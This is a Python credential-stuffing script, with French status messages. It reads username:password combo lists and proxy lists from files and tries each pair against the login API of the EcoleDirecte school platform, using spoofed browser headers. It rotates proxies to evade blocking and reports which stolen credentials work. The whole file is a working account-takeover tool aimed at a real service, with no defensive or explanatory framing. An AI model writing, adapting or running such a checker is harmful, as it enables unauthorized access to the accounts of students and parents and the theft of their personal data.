import requests


def getApiUrl():
    return "https://api.ecoledirecte.com/v3"


def getApiVersion():
    return "4.42.0"


def encodeString(string):
    return string.replace("%", "%25").replace("&", "%26").replace("+", "%2B").replace("+", "%2B").replace("\\",
                                                                                                          "\\\\\\").replace(
        "\\\\", "\\\\\\\\")


def encodeBody(dictionnary, isRecursive=False):
    body = ""
    for key in dictionnary:
        if isRecursive:
            body += "\"" + key + "\":"
        else:
            body += key + "="

        if type(dictionnary[key]) is dict:
            body += "{" + encodeBody(dictionnary[key], True) + "}"
        else:
            body += "\"" + str(dictionnary[key]) + "\""
        body += ","

    return body[:-1]


def get_smtg(path):
    f = open(path, "r+", encoding="Utf-8")
    combo = []
    for x in f.readlines():
        combo.append(x.replace("\n", ""))
    f.close()
    return combo


def getHeaders(token=None):
    headers = {
        "authority": "api.ecoledirecte.com",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.ecoledirecte.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.ecoledirecte.com/",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    if token != None:
        headers["X-Token"] = token

    return headers


combo = get_smtg("./combos/combo.txt")
proxies = get_smtg("./combos/proxies.txt")


class Bot:
    def __init__(self):
        self.token = None
        self.id = None

    def login(self, username, password, proxy):
        if proxy == "":
            login = requests.post(f"{getApiUrl()}/login.awp?v={getApiVersion()}", data=encodeBody({
                "data": {
                    "identifiant": username,
                    "motdepasse": password,
                    "isReLogin": False,
                    "uuid": ""
                }
            }), headers=getHeaders()).json()
        else:
            login = requests.post(f"{getApiUrl()}/login.awp?v={getApiVersion()}", data=encodeBody({
                "data": {
                    "identifiant": username,
                    "motdepasse": password,
                    "isReLogin": False,
                    "uuid": ""
                }
            }), headers=getHeaders(), proxies=proxy).json()

        print(login)
        return login


run = True
while combo:
    while run:
        proxy = {
            "http": proxies[0],
            "https": proxies[0]
        }
        try:
            combo2 = combo[0].split(":")
        except:
            break

        username = combo2[0]

        password = combo2[1]

        try:
            if run and proxies == []:
                response = Bot().login(username, password, "")
            else:
                response = Bot().login(username, password, proxy)
            try:
                if response["code"] == 200:
                    print("------------------------------------------------------------------------------------------")
                    if proxies:
                        print(f"[SUCCESS] Le Combo '{combo[0]}' est bon. Proxy utilisé '{proxies[0]}'")
                    else:
                        print(f"[SUCCESS] Le Combo '{combo[0]}' est bon. Proxy utilisé 'Your PC")
                        run = False
                    print("------------------------------------------------------------------------------------------")
                else:
                    print("----------------------------------------")
                    print(f"Le combo '{combo[0]}' n'es pas le bon")
            except:
                print("----------------------------------------")
                print(f"Le combo '{combo[0]}' n'es pas le bon")
            if combo:
                combo.pop(0)

        except:
            print("----------------------------------------")
            print(f"Proxy '{proxies[0]}' isn't valid. ")
            if proxies:
                proxies.pop(0)
